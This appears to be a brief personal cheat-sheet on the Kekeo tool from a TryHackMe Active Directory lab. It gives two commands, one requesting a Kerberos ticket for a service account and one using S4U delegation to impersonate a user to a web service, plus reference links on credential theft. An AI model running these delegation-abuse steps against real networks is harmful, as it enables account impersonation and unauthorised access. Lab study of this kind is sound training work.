# Kekeo

## CMD Line Examples
```
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:<password>
```

```
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRY
HACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
```


## References

Tool
- https://github.com/gentilkiwi/kekeo
- https://phonexicum.github.io/infosec/windows.html

Usage
- https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/#:~:text=Kekeo%20offers%20the%20tsssp::,used%20at%20two%20different%20moments:
- https://posts.specterops.io/from-kekeo-to-rubeus-86d2ec501c14
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-delegated-default-kerberos-and-ntlm-credentials-without-touching-lsass
- https://redfoxsec.com/blog/attacking-kerberos-delegation/#:~:text=We%20will%20use%20Kekeo%20to,to%20dump%20the%20TGS%20ticket.


